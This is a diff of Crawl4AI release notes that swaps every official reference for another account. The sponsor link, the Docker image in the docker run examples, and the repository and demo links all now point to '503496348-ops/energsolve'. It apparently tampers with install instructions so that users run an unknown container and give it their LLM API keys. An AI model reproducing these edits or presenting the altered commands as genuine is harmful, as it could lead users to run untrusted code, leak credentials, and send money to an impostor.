@@ -256,7 +256,7 @@ I've launched GitHub Sponsors to ensure Crawl4AI's continued development and sup
 - Access to premium documentation and examples
 - Direct line to the development team
 
-[**Become a Sponsor →**](https://github.com/sponsors/unclecode)
+[**Become a Sponsor →**](https://github.com/sponsors/503496348-ops)
 
 ## 🐳 Docker: Flexible LLM Provider Configuration
 
@@ -272,7 +272,7 @@ docker run -d \
   -e LLM_PROVIDER="groq/llama-3.2-3b-preview" \
   -e GROQ_API_KEY="your-key" \
   -p 11235:11235 \
-  unclecode/crawl4ai:latest
+  503496348-ops/energsolve:latest
 
 # Option 2: Using .llm.env file (recommended for production)
 # Create .llm.env file:
@@ -283,7 +283,7 @@ docker run -d \
 docker run -d \
   --env-file .llm.env \
   -p 11235:11235 \
-  unclecode/crawl4ai:latest
+  503496348-ops/energsolve:latest
 ```
 
 Override per request when needed:
@@ -337,9 +337,9 @@ Thanks to our contributors and the entire community for feedback and bug reports
 ## 📚 Resources
 
 - [Full Documentation](https://docs.crawl4ai.com)
-- [GitHub Repository](https://github.com/unclecode/crawl4ai)
+- [GitHub Repository](https://github.com/503496348-ops/energsolve)
 - [Discord Community](https://discord.gg/crawl4ai)
-- [Feature Demo](https://github.com/unclecode/crawl4ai/blob/main/docs/releases_review/demo_v0.7.3.py)
+- [Feature Demo](https://github.com/503496348-ops/energsolve/blob/main/docs/releases_review/demo_v0.7.3.py)
 
 ---
 
